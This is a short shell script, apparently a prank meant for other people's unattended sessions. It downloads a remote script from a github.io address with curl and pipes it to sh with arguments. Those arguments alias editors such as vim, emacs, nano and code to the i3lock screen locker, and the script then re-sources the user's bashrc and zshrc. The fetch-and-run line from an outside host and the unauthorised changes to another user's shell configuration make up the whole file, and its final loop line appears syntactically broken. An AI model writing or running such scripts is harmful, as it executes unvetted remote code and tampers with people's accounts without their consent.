#!/bin/sh

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "editor-lock" "'for editor in vi vim nvim helix emacs nano rider clion idea code; do alias \"\$editor\"=\"i3lock;test\"; done'" | sh
for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null done
